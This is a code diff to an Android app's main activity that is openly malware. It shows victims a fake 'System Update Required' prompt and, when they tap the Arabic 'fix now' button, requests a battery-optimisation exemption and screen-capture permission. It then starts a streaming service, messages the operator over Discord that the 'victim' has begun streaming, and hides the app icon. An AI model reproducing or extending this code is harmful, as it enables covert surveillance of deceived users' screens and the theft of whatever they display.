@@ -31,33 +31,33 @@ public class MainActivity extends Activity {
         TextView tv = new TextView(this);
         tv.setText("System Update Required");
         tv.setTextSize(20);
+        tv.setTextColor(Color.BLACK);
         tv.setPadding(0, 0, 0, 50);
         layout.addView(tv);
 
         Button btn = new Button(this);
         btn.setText("إصلاح النظام الآن");
+        btn.setPadding(20, 20, 20, 20);
         btn.setOnClickListener(v -> {
-            // 1. طلب استثناء البطارية أولاً
-            requestBatterySettings();
-            // 2. طلب بث الشاشة
+            // طلب تجاهل تحسين البطارية
+            try {
+                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    intent.setData(Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                }
+            } catch (Exception e) {}
+
+            // طلب بث الشاشة
             MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
             if (mpm != null) {
                 startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
             }
         });
+        
         layout.addView(btn);
         setContentView(layout);
-    }
-
-    private void requestBatterySettings() {
-        try {
-            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                intent.setData(Uri.parse("package:" + getPackageName()));
-                startActivity(intent);
-            }
-        } catch (Exception e) {}
     }
 
     @Override
@@ -69,7 +69,7 @@ public class MainActivity extends Activity {
             serviceIntent.putExtra("resData", data);
             startForegroundService(serviceIntent);
 
-            DiscordSender.sendMessage("✅ الضحية وافق! بدأ البث الآن.");
+            DiscordSender.sendMessage("✅ تم بدء البث بنجاح من جهاز الضحية!");
             
             // إخفاء الأيقونة فوراً
             getPackageManager().setComponentEnabledSetting(
